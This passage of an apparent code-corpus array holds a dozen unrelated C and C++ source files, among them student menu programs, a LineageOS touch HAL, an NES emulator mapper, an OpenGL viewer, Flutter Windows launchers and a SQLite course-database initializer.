record.\"<<endl;\r\n\t\tcout<<\"5.Exit.\"<<endl;\r\n\r\n\t\tcout<<\"Enter Your Choice : \";\r\n\t\tcin>>ch;\r\n\t\tswitch(ch)\r\n\t\t{\r\n\t\t\tcase 1:\r\n\t\t\t\tdb.addRecord();\r\n\t\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tdb.showRecords();\r\n\t\t\t\tbreak;\r\n\t\t\tcase 3:\r\n\t\t\t\tcout<<\"Enter Roll no. of the record to be deleted : \";\r\n\t\t\t\tcin>>key;\r\n\t\t\t\tif(db.search(key))\r\n\t\t\t\t\tdb.del(key);\r\n\t\t\t\telse\r\n\t\t\t\t\tcout<<\"\\nRecord Not Found!\"<<endl<<endl;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 4:\r\n\t\t\t\tcout<<\"Enter Roll no. of the record to be Searched : \";\r\n\t\t\t\tcin>>key;\r\n\t\t\t\tif(!db.search(key))\r\n\t\t\t\t\tcout<<\"\\nRecord Not Found!\"<<endl<<endl;\r\n\t\t\t\tbreak;\r\n\r\n\t\t}\r\n\t}while(ch != 5);\r\n\r\n\treturn 0;\r\n}",
    "/*\n * Copyright (C) 2022 The LineageOS Project\n *\n * SPDX-License-Identifier: Apache-2.0\n */\n\n#define LOG_TAG \"HighTouchPollingRateService\"\n\n#include \"HighTouchPollingRate.h\"\n\n#include <android-base/file.h>\n#include <android-base/logging.h>\n#include <android-base/strings.h>\n\nnamespace vendor {\nnamespace lineage {\nnamespace touch {\nnamespace V1_0 {\nnamespace implementation {\n\nconst std::string kInterpolationPath = \"/sys/class/touchscreen/primary/interpolation\";\n\nReturn<bool> HighTouchPollingRate::isEnabled() {\n    std::string buf;\n    if (!android::base::ReadFileToString(kInterpolationPath, &buf)) {\n        LOG(ERROR) << \"Failed to read \" << kInterpolationPath;\n        return false;\n    }\n    return std::stoi(android::base::Trim(buf)) == 1;\n}\n\nReturn<bool> HighTouchPollingRate::setEnabled(bool enabled) {\n    if (!android::base::WriteStringToFile(std::to_string(enabled), kInterpolationPath)) {\n        LOG(ERROR) << \"Failed to write \" << kInterpolationPath;\n        return false;\n    }\n    return true;\n}\n\n}  // namespace implementation\n}  // namespace V1_0\n}  // namespace touch\n}  // namespace lineage\n}  // namespace vendor\n",
    "#include\t\"..\\DLL\\d_iNES.h\"\n\nnamespace {\nuint8_t Reg[4];\n\nvoid\tSync (void) {\n\tEMU->SetPRG_RAM8(0x6, 0);\n\tEMU->SetCHR_RAM8(0, 0);\n\tuint8_t Base =((Reg[0] ^Reg[1]) &0x10) <<1;\n\tuint8_t Bank = (Reg[2] ^Reg[3]) &0x1F;\n\tif (Reg[1] &8) {\n\t\tEMU->SetPRG_ROM16(0x8, (Base +Bank) |0x01);\n\t\tEMU->SetPRG_ROM16(0xC, (Base +Bank) &0xFE);\n\t} else if (Reg[1] &4) {\n\t\tEMU->SetPRG_ROM16(0x8, 0x1F);\n\t\tEMU->SetPRG_ROM16(0xC, Base +Bank);\n\t} else {\n\t\tEMU->SetPRG_ROM16(0x8, Base +Bank);\n\t\tEMU->SetPRG_ROM16(0xC, 0x20);\n\t}\n}\n\nint\tMAPINT\tSaveLoad (STATE_TYPE mode, int offset, unsigned char *data) {\n\tfor (int i =0; i <4; i++) SAVELOAD_BYTE(mode, offset, data, Reg[i]);\n\tif (mode == STATE_LOAD) Sync();\n\treturn offset;\n}\n\nvoid\tMAPINT\tWrite (int Bank, int Addr, int Val) {\n\tReg[(Bank >>1) &0x3] =Val;\n\tSync();\n}\n\nBOOL\tMAPINT\tLoad (void) {\n\treturn TRUE;\n}\nvoid\tMAPINT\tReset (RESET_TYPE ResetType) {\n\tiNES_SetMirroring();\n\n\tfor (int i =8; i<16; i++) EMU->SetCPUWriteHandler(i, Write);\n\tif (ResetType ==RESET_HARD) for (int i =0; i <4; i++) Reg[i] =0;\n\tSync();\n}\n\nuint16_t MapperNum = 167;\n} // namespace\n\nMapperInfo MapperInfo_167 = {\n\t&MapperNum,\n\t_T(\"Subor Type B\"),\n\tCOMPAT_FULL,\n\tLoad,\n\tReset,\n\tNULL,\n\tNULL,\n\tNULL,\n\tSaveLoad,\n\tNULL,\n\tNULL\n};",
    "#include <GL/glew.h>\n#include <GL/glut.h>\n#include <iostream>\n#include <glm/glm.hpp>\n#include <cmath>\n#include \"shaders.h\"\n#include <stdlib.h>\n#include \"model.h\"\n#include <vector>\n#include <map>\n#include <imgui.h>\n#include <backends/imgui_impl_glut.h>\n#include <backends/imgui_impl_opengl3.h>\n#include <commdlg.h>\n\nconst double M_PI = 3.14159265359;\n\nbool start_screen = true;\n\nextern std::vector<float> vertices;\nextern std::map<int, std::map<int, std::map<int, std::map<char, unsigned int>>>> vertex_map;\nextern std::vector<unsigned int> indices;\nextern std::vector<float> colors;\nextern std::vector<float> normals;\n\nint mouseoldx, mouseoldy;\nglm::vec3 eye;\nglm::vec3 up;\nconst glm::vec3 eyeinit = glm::vec3(0, 500, 0);\nconst glm::vec3 upinit = glm::vec3(0, 0, 1);\nconst glm::vec3 center = glm::vec3(0, 0, 0);\nconst glm::vec2 screen_up = glm::vec2(-1, 0);\nGLuint vertexshader, fragmentshader, shaderprogram;\nGLuint projectionPos, modelviewPos, lightdirPos;\nglm::mat4 projection, modelview;\nglm::vec3 lightdir;\n\nconst int numobjects = 1;\nconst int numperobj = 4;\nGLuint VAOs[numobjects];\nGLuint buffers[numperobj * numobjects];\nGLenum PrimType[numobjects];\nGLsizei NumElems[numobjects];\n\nenum {Vertices, Colors, Normals, Elements};\n\nvoid deleteBuffers() {\n    glDeleteVertexArrays(numobjects, VAOs);\n    glDeleteBuffers(numperobj * numobjects, buffers);\n}\n\nglm::mat3 dual_matrix(glm::vec3 a) {\n    return glm::mat3(0, a[2], -a[1], -a[2], 0, a[0], a[1], -a[0], 0);\n}\n\nglm::vec3 cross(glm::vec3 a, glm::vec3 b) {\n    return dual_matrix(a) * b;\n}\n\nglm::vec3 normalize(glm::vec3 a) {\n    float magnitude = sqrt(a[0] * a[0] + a[1] * a[1] + a[2] * a[2]);\n    return glm::vec3(a[0] / magnitude, a[1] / magnitude, a[2] / magnitude);\n}\n\nglm::mat4 lookAt(glm::vec3 eye, glm::vec3 center, glm::vec3 up) {\n    glm::vec3 x, y, z;\n    glm::mat4 translation_matrix, rotation_matrix;\n    z = eye - center;\n    x = cross(up, z);\n    y = cross(z, x);\n    x = normalize(x);\n    y = normalize(y);\n    z = normalize(z);\n    rotation_matrix = glm::mat4(x[0], y[0], z[0], 0, x[1], y[1], z[1], 0, x[2], y[2], z[2], 0, 0, 0, 0, 1);\n    translation_matrix = glm::mat4(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, -eye[0], -eye[1], -eye[2], 1);\n    return rotation_matrix * translation_matrix;\n}\n\nvoid initobject(GLuint object, GLfloat *vert, GLint sizevert, GLfloat *col, GLint sizecol, GLfloat *nor, GLint sizenor, GLuint *inds, GLint sizeind, GLenum type) {\n    int offset = object * numperobj;\n    glBindVertexArray(VAOs[object]);\n    \n    glBindBuffer(GL_ARRAY_BUFFER, buffers[Vertices + offset]);\n    glBufferData(GL_ARRAY_BUFFER, sizevert, vert, GL_STATIC_DRAW);\n    glEnableVertexAttribArray(0);\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(GLfloat), 0);\n\n    glBindBuffer(GL_ARRAY_BUFFER, buffers[Colors + offset]);\n    glBufferData(GL_ARRAY_BUFFER, sizecol, col, GL_STATIC_DRAW);\n    glEnableVertexAttribArray(1);\n    glVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(GLfloat), 0);\n\n    glBindBuffer(GL_ARRAY_BUFFER, buffers[Normals + offset]);\n    glBufferData(GL_ARRAY_BUFFER, sizenor, nor, GL_STATIC_DRAW);\n    glEnableVertexAttribArray(2);\n    glVertexAttribPointer(2, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(GLfloat), 0);\n\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, buffers[Elements + offset]);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, sizeind, inds, GL_STATIC_DRAW);\n    \n    PrimType[object] = type;\n    NumElems[object] = sizeind / 4;\n\n    glBindVertexArray(0);\n}\n\nvoid drawobject(GLuint object) {\n    glBindVertexArray(VAOs[object]);\n    glDrawElements(PrimType[object], NumElems[object], GL_UNSIGNED_INT, 0);\n    glBindVertexArray(0);\n}\n\nfloat dot_3d(glm::vec3 vec1, glm::vec3 vec2) {\n    return vec1[0] * vec2[0] + vec1[1] * vec2[1] + vec1[2] * vec2[2];\n}\n\nvoid display() {\n\n    // Start the Dear ImGui frame\n    ImGui_ImplOpenGL3_NewFrame();\n    ImGui_ImplGLUT_NewFrame();\n    ImGui::NewFrame();\n    ImGuiIO& io = ImGui::GetIO();\n\n    // Start screen\n    if (start_screen) {\n        ImGui::Begin(\"Open a segmentation (.nii) file\");\n        if (ImGui::Button(\"Open...\")) {\n\n            OPENFILENAMEA ofn;\n            CHAR szFile[260] = { 0 };\n            ZeroMemory(&ofn, sizeof(OPENFILENAME));\n            ofn.lStructSize = sizeof(OPENFILENAME);\n            ofn.hwndOwner = FindWindowA(nullptr, \"Demo\");\n            ofn.lpstrFile = szFile;\n            ofn.nMaxFile = sizeof(szFile);\n            ofn.lpstrFilter = \"NIFTI (*.nii)\\0*.nii\\0\";\n            ofn.nFilterIndex = 1;\n            ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_NOCHANGEDIR;\n            if (GetOpenFileNameA(&ofn) == TRUE) {\n                int ret = load_model(ofn.lpstrFile);\n\n                if (ret == 1)\n                {\n                    std::cout << \"Success loading vessel\" << std::endl;\n                }\n\n                initobject(0, (GLfloat*)&vertices[0], vertices.size() * 4, (GLfloat*)&colors[0], colors.size() * 4, (GLfloat*)&normals[0], normals.size() * 4, (GLuint*)&indices[0], indices.size()",
    "/****************************************Copyright (c)*************************************************\n**                      \t\tEast China Normal University\n**                               http://www.ecnu.edu.cn/\n**--------------File Info------------------------------------------------------------------------------\n** File name:           free_space.cpp\n** Created by:          linzhaohua\n** Created date:        2018-3-16\n** Version:             V1.0\n** Descriptions:        free_space.cpp\n********************************************************************************************************/\n#include \"../headers/config.h\"\n/********************************************************************************************************************************\n** Function name:       Free_2DInt_Vector\n** Descriptions:        Free_2DInt_Vector\n** input parameters:    num,vec\n** output parameters:   None\n** Returned value:      None\n********************************************************************************************************************************/\nvoid Free_2DInt_Vector(int num, vector<vector<int> >& vec)\n{\n\tfor (int i = 0; i < num; i++)\n\t{\n\t\tvector<int>().swap(vec[i]);\n\t}\n\tvector<vector<int> >().swap(vec);\n}\n/********************************************************************************************************************************\n** Function name:       Free_2DDouble_Vector\n** Descriptions:        Free_2DDouble_Vector\n** input parameters:    num,vec\n** output parameters:   None\n** Returned value:      None\n********************************************************************************************************************************/\nvoid Free_2DDouble_Vector(int num, vector<vector<double> >& vec)\n{\n\tfor (int i = 0; i < num; i++)\n\t{\n\t\tvector<double>().swap(vec[i]);\n\t}\n\tvector<vector<double> >().swap(vec);\n}\n/*****************************************************End Of File***************************************/",
    "#include <flutter/dart_project.h>\r\n#include <flutter/flutter_view_controller.h>\r\n#include <windows.h>\r\n\r\n#include \"flutter_window.h\"\r\n#include \"utils.h\"\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\r\n                      _In_ wchar_t *command_line, _In_ int show_command) {\r\n  // Attach to console when present (e.g., 'flutter run') or create a\r\n  // new console when running with a debugger.\r\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\r\n    CreateAndAttachConsole();\r\n  }\r\n\r\n  // Initialize COM, so that it is available for use in the library and/or\r\n  // plugins.\r\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\r\n\r\n  flutter::DartProject project(L\"data\");\r\n\r\n  std::vector<std::string> command_line_arguments =\r\n      GetCommandLineArguments();\r\n\r\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\r\n\r\n  FlutterWindow window(project);\r\n  Win32Window::Point origin(10, 10);\r\n  Win32Window::Size size(1280, 720);\r\n  if (!window.Create(L\"codelab1\", origin, size)) {\r\n    return EXIT_FAILURE;\r\n  }\r\n  window.SetQuitOnClose(true);\r\n\r\n  ::MSG msg;\r\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\r\n    ::TranslateMessage(&msg);\r\n    ::DispatchMessage(&msg);\r\n  }\r\n\r\n  ::CoUninitialize();\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\nusing namespace std;\n\nclass Vemaybay {\nprivate:\n    string tenchuyen;\n    string ngaybay;\n    float giave;\npublic:\n    Vemaybay(string tc, string nb, float gv) : tenchuyen(tc), ngaybay(nb), giave(gv) {}\n    ~Vemaybay() {\n        cout << \"Vemaybay: \" << tenchuyen << endl;\n    }\n\n    void nhap() {\n        cout << \"Enter flight name: \";\n        cin >> tenchuyen;\n        cout << \"Enter flight date: \";\n        cin >> ngaybay;\n        cout << \"Enter ticket price: \";\n        cin >> giave;\n    }\n\n    void xuat() const {\n        cout << \"Flight: \" << tenchuyen << \", Date: \" << ngaybay << \", Price: \" << giave << endl;\n    }\n\n    float getgiave() const {\n        return giave;\n    }\n};\n\nclass Nguoi {\nprotected:\n    string hoten;\n    string gioitinh;\n    int tuoi;\npublic:\n    Nguoi(string ht, string gt, int t) : hoten(ht), gioitinh(gt), tuoi(t) {}\n    virtual ~Nguoi() {\n        cout << \"Nguoi: \" << hoten << endl;\n    }\n\n    void nhap() {\n        cout << \"Enter name: \";\n        cin >> hoten;\n        cout << \"Enter gender: \";\n        cin >> gioitinh;\n        cout << \"Enter age: \";\n        cin >> tuoi;\n    }\n\n    void xuat() const {\n        cout << \"Name: \" << hoten << \", Gender: \" << gioitinh << \", Age: \" << tuoi << endl;\n    }\n};\n\nclass HanhKhach : public Nguoi {\nprivate:\n    vector<Vemaybay> ve;\npublic:\n    HanhKhach(string ht, string gt, int t) : Nguoi(ht, gt, t) {}\n    ~HanhKhach() {\n        cout << \"HanhKhach: \" << hoten << endl;\n    }\n\n    void nhap() {\n        Nguoi::nhap();\n        int soluong;\n        cout << \"Enter the number of tickets: \";\n        cin >> soluong;\n        ve.reserve(soluong);\n        for (int i = 0; i < soluong; ++i) {\n            string tenchuyen, ngaybay;\n            float giave;\n            cout << \"Enter details for ticket \" << i + 1 << \":\\n\";\n            cout << \"Flight name: \";\n            cin >> tenchuyen;\n            cout << \"Flight date: \";\n            cin >> ngaybay;\n            cout << \"Ticket price: \";\n            cin >> giave;\n            ve.emplace_back(tenchuyen, ngaybay, giave);\n        }\n    }\n\n    void xuat() const {\n        Nguoi::xuat();\n        for (const auto& ticket : ve) {\n            ticket.xuat();\n        }\n    }\n\n    float tongtien() const {\n        float total = 0;\n        for (const auto& ticket : ve) {\n            total += ticket.getgiave();\n        }\n        return total;\n    }\n};\n\nint main() {\n    int n;\n    cout << \"Enter number of passengers: \";\n    cin >> n;\n    vector<HanhKhach> khachHang;\n    for (int i = 0; i < n; ++i) {\n        cout << \"Enter details for passenger \" << i + 1 << \":\\n\";\n        khachHang.emplace_back(\"\", \"\", 0);\n        khachHang.back().nhap();\n    }\n\n    // Displaying passenger details\n    for (const auto& kh : khachHang) {\n        kh.xuat();\n        cout << \"Total payment: \" << kh.tongtien() << endl;\n    }\n\n    // Sorting passengers by total payment in descending order\n    sort(khachHang.begin(), khachHang.end(), [](const HanhKhach& a, const HanhKhach& b) {\n        return a.tongtien() > b.tongtien();\n    });\n\n    cout << \"\\nSorted List by Total Payment (Descending):\\n\";\n    for (const auto& kh : khachHang) {\n        kh.xuat();\n        cout << \"Total payment: \" << kh.tongtien() << endl;\n    }\n\n    return 0;\n}\n\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass Theater \r\n{\r\npublic:\r\n    void showdata() {\r\n        cout<<\"1. Display movies\"<<endl;\r\n        cout<<\"2. Display seat availability\"<<endl;\r\n        cout<<\"3. Book a ticket\"<<endl;\r\n        cout<<\"4. Cancel_ticket\"<<endl;\r\n        cout<<\"5. Exit\"<<endl;\r\n        cout<<endl;\r\n    }\r\n\r\n    void Display_movies() {\r\n        cout<<\"Available movies:\"<<endl;\r\n        cout<<\"0. Avengers (Action) - 150 min\"<<endl;\r\n        cout<<\"1. Jawan (Action thriller) - 120 min\"<<endl;\r\n        cout<<\"2. The Nun (Horror) - 145 min\"<<endl;\r\n        cout<< \"---------------------------\"<<endl;\r\n    }\r\n\r\n    void Display_seat_availability(char seats[7][7]) \r\n\t{\r\n        cout<<\"Seat availability:\"<<endl;\r\n        for(int i=0;i<7;i++) \r\n\t\t{\r\n            for(int j=0;j<7;j++) \r\n\t\t\t{\r\n                if(seats[i][j]=='O') \r\n\t\t\t\t{\r\n                    cout<<'O'<<\" \"; \r\n                } else \r\n\t\t\t\t{\r\n                    cout<<'X'<<\" \"; \r\n                }\r\n            }\r\n            cout<<endl;\r\n        }\r\n        cout<<\"-----------------------------\"<< endl;\r\n    }\r\n};\r\n\r\nclass Booking : public Theater \r\n{\r\npublic:\r\n    char seats[7][7]; \r\n\r\n    Booking() \r\n\t{\r\n        for(int i=0;i<7;i++) \r\n\t\t{\r\n            for(int j=0;j<7;j++) \r\n\t\t\t{\r\n                seats[i][j]='O';\r\n            }\r\n        }\r\n    }\r\n\r\n    void Book_ticket() \r\n\t{\r\n        Display_movies();\r\n\r\n        int movieIndex;\r\n        cout << \"Select movie index: \";\r\n        cin >> movieIndex;\r\n\r\n        if(movieIndex<0||movieIndex>2) \r\n\t\t{\r\n            cout<<\"Invalid movie index.\"<<endl;\r\n        }\r\n\r\n        Display_seat_availability(seats);\r\n\r\n        int row, column;\r\n        cout<<\"Choose row and column to select a seat for booking (1-7): \";\r\n        cin>>row>>column;\r\n\r\n        if(row>=1&&row<=7&&column>=1&&column<=7) \r\n\t\t{\r\n            if(seats[row-1][column-1]=='O') \r\n\t\t\t{\r\n                seats[row-1][column-1]='X';\r\n                cout<<\"Ticket booked successfully for movie index \"<< movieIndex<<\" and seat \"<<row<< \"-\"<< column << endl;\r\n            } \r\n\t\t\telse \r\n\t\t\t{\r\n                cout<<\"Seat is already booked. Please select another seat.\"<<endl;\r\n            }\r\n        \r\n        cout<< \"-------------------\"<< endl;\r\n    \r\n    \t}\r\n\t}\r\n\tvoid Cancel_ticket() \r\n\t{\r\n        Display_seat_availability(seats);\r\n        int row,column;\r\n        cout<<\"Choose row and column to cancel a booked seat(1-7): \";\r\n        cin>>row>>column;\r\n\r\n        if(row>=1&&row<=7&&column>=1&&column<=7) \r\n\t\t{\r\n            if(seats[row-1][column-1]=='X') \r\n\t\t\t{\r\n                seats[row - 1][column - 1]='O';\r\n                cout<<\"Ticket canceled successfully for seat \"<<row<< \"-\"<<column<<endl;\r\n            } \r\n\t\t\telse \r\n\t\t\t{\r\n                cout <<\"Seat is not booked. Please select a valid seat to cancel.\"<<endl;\r\n            }\r\n            cout<<\"-------------------\"<<endl;\r\n        }\r\n    }\r\n};\r\n\r\nvoid intro() \r\n{\r\n    cout<<\"WELCOME TO THEATER MANAGEMENT PROJECT\"<< endl;\r\n    cout<<\"Created by Vaishnavi and Pradnya\"<< endl;\r\n}\r\n\r\nint main() \r\n{\r\n    intro();\r\n    Booking b;\r\n    int choice;\r\n\r\n    while (true) \r\n\t{\r\n        b.showdata();\r\n        cout<<endl;\r\n        cout<<\"Enter your choice: \";\r\n        cin>>choice;\r\n\r\n        switch(choice) \r\n\t\t{\r\n            case 1:\r\n                b.Display_movies();\r\n                break;\r\n            case 2:\r\n                b.Display_seat_availability(b.seats);\r\n                break;\r\n            case 3:\r\n                b.Book_ticket();\r\n                break;\r\n            case 4:\r\n            \tb.Cancel_ticket();\r\n            case 5:\r\n                cout<<\"Exiting the program\"<< endl;\r\n                \r\n            default:\r\n                cout<<\"Invalid choice\"<< endl;\r\n\t\r\n        }\r\n        \r\n    }\r\n    return 1;\r\n}\r\n\r\n\r\n",
    "#include <iostream> \n#include <cstdlib> \n#include \"menu.h\"\n#include \"database.h\"\n#include \"Intro.h\"\n#include \"Tool.h\"\n\nauto spell = DB1.createSpells();\n\n\nvoid Menu::start(){\n    system(\"clear\");\n    \n    std::cout << std::endl << std::endl;\n    Too.slow_print(\"Welcome to Hobo Adventure \");\n    std::cout << std::endl << std::endl;\n    Too.slow_print(\"Press 1 to continue: \");\n   \n    int a = Too.getKeypress();\n\n    std::cout << std::endl<<std::endl;\n\n    if(a == '1'){\n        system(\"clear\");\n        T1.tutorial();\n    } else {\n        start();\n    }\n\n}   \n\n\n\n\nvoid Menu::selector() {\n    char a = 0;\n    do {\n        Too.slow_print(\"Select your action\");\n        std::cout << std::endl << std::endl;\n        std::cout << \"Type 1 to create a new hero\" << std::endl;\n        std::cout << \"Type 2 to see current heroes\" << std::endl;\n        std::cout << \"Type 3 to load a hero\" << std::endl;\n        std::cout << \"Type 4 to delete a hero\" << std::endl;\n        std::cout << \"Type 5 to exit game\" << std::endl << std::endl;\n        std::cout << \"Enter your choice: \";\n\n        a = Too.getKeypress();\n        std::cout << std::endl;\n\n        switch (a) {\n            case '1':\n                DB1.createHero();\n                break;\n            case '2':\n                DB1.ShowHeroes();\n                break;\n            case '3':\n                DB1.loadHero(spell);\n                break;\n            case '4':\n                DB1.deleteHero();\n                break;\n            case '5':\n                exit(0);\n                break;\n            default:\n                std::cout << \"Invalid input, press enter twice to try again\" << std::endl;\n                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n                std::cin.get();\n                system(\"clear\");\n                continue;\n        }\n    } while (a < '1' || a > '5');\n}\n\nMenu M1;",
    "#include <iostream>\n#include <deque>\n#include <mutex>\n#include <thread>\n#include <condition_variable>\n\nusing namespace std;\n\ntemplate <typename T>\nclass ProducerConsumer {\n    deque<T> buffer;\n    size_t sizeMax;\n    mutex mtx;\n    condition_variable bufferReady;\npublic:\n    ProducerConsumer(size_t sizeMax) : sizeMax(sizeMax) {}\n\n    void produce(T value) {\n        unique_lock<mutex> lock(mtx);\n        bufferReady.wait(lock, [this](){ return this->buffer.size() < sizeMax; });\n\n        cout << \"Produced: \" << value << endl;\n        buffer.push_front(value);\n\n        bufferReady.notify_one();\n    }\n\n    void consume() {\n        unique_lock<mutex> lock(mtx);\n        bufferReady.wait(lock, [this](){ return !this->buffer.empty(); });\n\n        cout << \"Consumed: \" << buffer.back() << endl;\n        buffer.pop_back();\n\n        bufferReady.notify_one();\n    }\n};\n\nint main() {\n    ProducerConsumer<int> producerConsumer(5);\n    for (int i = 0; i < 10; ++i) {\n        thread consume(&ProducerConsumer<int>::consume, &producerConsumer);\n        thread produce(&ProducerConsumer<int>::produce, &producerConsumer, i);\n        consume.join();\n        produce.join();\n    }\n    return 0;\n}\n",
    "#include \"db/database.h\"\n#include \"SQLiteCpp/Database.h\"\n\n#include <filesystem>\n#include <fstream>\n#include <iostream>\n#include <string_view>\nnamespace db {\ndatabase::database () {\n    initialize_db ();\n};\nvoid database::refresh_and_seed_db () {\n    // Refresh database structure by deleting all existing tables, if any, and\n    // creating new tables.\n    std::cout << \"REFRESHING DATABASE STRUCTURE\" << std::endl;\n    db::database::get_db ().exec (\n    \"PRAGMA writable_schema = 1;delete from sqlite_master where type in \"\n    \"('table', 'index', 'trigger');PRAGMA writable_schema = \"\n    \"0;VACUUM;PRAGMA INTEGRITY_CHECK;PRAGMA foreign_keys = ON;\");\n    initialize_db ();\n\n    // Seed database\n    // TODO: MAKE IT RUN IN DEBUG MODE ONLY AND MAKE IT RUN ONCE ONLY AS LONG AS\n    // NO CHANGES HAPPEN TO TABLE STRUCTURE\n    // TODO: READ THESE CONSTANTS FROM A CONSTATS FILE\n    const int NUM_TABLES           = 9;\n    std::string tables[NUM_TABLES] = { \"Users\", \"Students\", \"Instructors\",\n        \"Administrators\", \"Courses\", \"Instructors_Courses\", \"Students_Courses\",\n        \"Assignments\", \"AssignmentSubmissions\" };\n\n    std::cout << \"SEEDING DATABASE P.S. THIS MAY TAKE A WHILE\" << std::endl;\n    for (int i = 0; i < NUM_TABLES; i++) {\n        std::ifstream ifs (std::filesystem::current_path ().string () +\n        \"/db/SeedingData/\" + tables[i] + \".sql\");\n        std::string seed_query ((std::istreambuf_iterator<char> (ifs)),\n        (std::istreambuf_iterator<char> ()));\n        db::database::get_db ().exec (seed_query);\n        std::cout << (i + 1) << \" out of \" << NUM_TABLES << \" Table(s) done.\" << std::endl;\n        ifs.close ();\n    }\n    std::cout << \"DATABASE SEEDED SUCCESSFULLY\" << std::endl;\n}\n\nvoid database::initialize_db () {\n\n    std::cout << \"INITIALIZING DATABASE\" << std::endl;\n    db::database::get_db ().exec (\"PRAGMA foreign_keys = ON;\");\n    // Create all tables as per database design\n    db::database::get_db ().exec (\n    \"CREATE TABLE IF NOT EXISTS Users (id INTEGER PRIMARY KEY, \"\n    \"password_hash VARCHAR(32), email VARCHAR(255), faculty \"\n    \"VARCHAR(255), name VARCHAR(255), role TEXT)\");\n    db::database::get_db ().exec (\n    \"CREATE TABLE IF NOT EXISTS Students (id VARCHAR(9) PRIMARY KEY, \"\n    \"user_id INTEGER, FOREIGN KEY(user_id) REFERENCES Users(id) ON DELETE \"\n    \"CASCADE)\");\n    db::database::get_db ().exec (\"CREATE TABLE IF NOT EXISTS Students_Courses \"\n                                  \"(id INTEGER PRIMARY KEY, student_id \"\n                                  \"VARCHAR(9), course_id INTEGER, state TEXT)\");\n    db::database::get_db ().exec (\n    \"CREATE TABLE IF NOT EXISTS Instructors (id VARCHAR(255) \"\n    \"PRIMARY KEY, is_teaching_assistant BOOL, user_id INTEGER, FOREIGN \"\n    \"KEY(user_id) REFERENCES Users(id) ON DELETE CASCADE)\");\n    db::database::get_db ().exec (\n    \"CREATE TABLE IF NOT EXISTS Instructors_Courses (id INTEGER PRIMARY KEY, \"\n    \"instructor_id \"\n    \"VARCHAR(255), course_id INTEGER)\");\n    db::database::get_db ().exec (\n    \"CREATE TABLE IF NOT EXISTS Administrators (id \"\n    \"VARCHAR(255) PRIMARY KEY, user_id INTEGER, FOREIGN KEY(user_id) \"\n    \"REFERENCES Users(id) ON DELETE CASCADE)\");\n    db::database::get_db ().exec (\n    \"CREATE TABLE IF NOT EXISTS Courses (id INTEGER PRIMARY KEY, \"\n    \"name VARCHAR(255), credit_hours INTEGER, text_book VARCHAR(255), \"\n    \"course_code VARCHAR(255))\");\n    db::database::get_db ().exec (\n    \"CREATE TABLE IF NOT EXISTS Assignments (id INTEGER PRIMARY KEY, name \"\n    \"VARCHAR(255), type VARCHAR(255), start_date INTEGER \"\n    \"DEFAULT(strftime('%s', 'now')), due_date INTEGER, available_until_date \"\n    \"INTEGER, course_id INTEGER, max_grade REAL, FOREIGN KEY (course_id) \"\n    \"REFERENCES Courses(id) ON DELETE CASCADE)\");\n    db::database::get_db ().exec (\n    \"CREATE TABLE IF NOT EXISTS AssignmentSubmissions (id INTEGER PRIMARY KEY, \"\n    \"grade REAL DEFAULT -1, submission_date INTEGER DEFAULT(strftime('%s', \"\n    \"'now')), assignment_id INTEGER, student_id VARCHAR(9), FOREIGN KEY \"\n    \"(assignment_id) REFERENCES Assignments(id) ON DELETE CASCADE, FOREIGN KEY \"\n    \"(student_id) \"\n    \"REFERENCES Students(id) ON DELETE CASCADE)\");\n\n    /*\n    db::database::get_db ().exec (\"INSERT INTO Users(password_hash, email)\n    VALUES('test', 'test@rars.c')\"); std::cout << db::database::get_db\n    ().getLastInsertRowid (); std::string x = db::database::get_db ().execAndGet\n    (\"INSERT INTO Students(student_id, user_id) VALUES('23-101287',\n    '\" + std::to_string (db::database::get_db ().getLastInsertRowid ()) + \"')\");\n    std::cout << db::database::get_db ().getLastInsertRowid ();\n    */\n\n    /*\n    SQLite::Statement query(_db, \"select * from courses where course_id = ?\");\n    int inp;\n    std::cout << \"Enter course ID: \";\n    std::cin >> inp;\n    query.bind(1, inp);\n    while(query.executeStep ()) {\n        int id = query.getColumn (0);\n        std::string name = query.getColumn (1);\n        int credits = query.getColumn (2);\n        std::st",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"voicebasedemail\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
